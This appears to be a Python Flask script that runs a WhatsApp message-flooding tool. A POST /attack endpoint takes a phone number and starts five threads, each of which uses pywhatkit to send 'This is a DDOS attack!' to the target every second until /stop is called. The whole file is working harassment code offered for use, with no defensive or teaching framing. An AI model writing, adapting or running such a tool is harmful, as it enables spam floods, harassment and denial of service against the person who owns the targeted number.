from flask import Flask, request, jsonify
import pywhatkit
import threading
import time

app = Flask(__name__)

# Global variable to control the attack
running = True

def attack_wa(phone_number):
    global running
    while running:
        try:
            # Send WhatsApp message using pywhatkit
            pywhatkit.sendwhatmsg_instantly(
                phone_number,
                "This is a DDOS attack!", # Message content
                tab_close=True # Close the tab after sending
            )
            print(f"Message sent to {phone_number}")
            time.sleep(1) # Wait for 1 second between messages
        except Exception as e:
            print(f"Error sending message to {phone_number}: {e}")
            break

@app.route('/attack', methods=['POST'])
def start_attack():
    global running
    phone_number = request.form['phone_number']
    num_threads = 5 # Number of threads (adjust as needed)
    running = True

    # Start threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_wa, args=(phone_number,))
        threads.append(thread)
        thread.start()

    return jsonify({'status': 'Attacking...', 'number': phone_number})

@app.route('/stop', methods=['POST'])
def stop_attack():
    global running
    running = False
    return jsonify({'status': 'Stopped'})

if __name__ == '__main__':
    app.run(debug=True)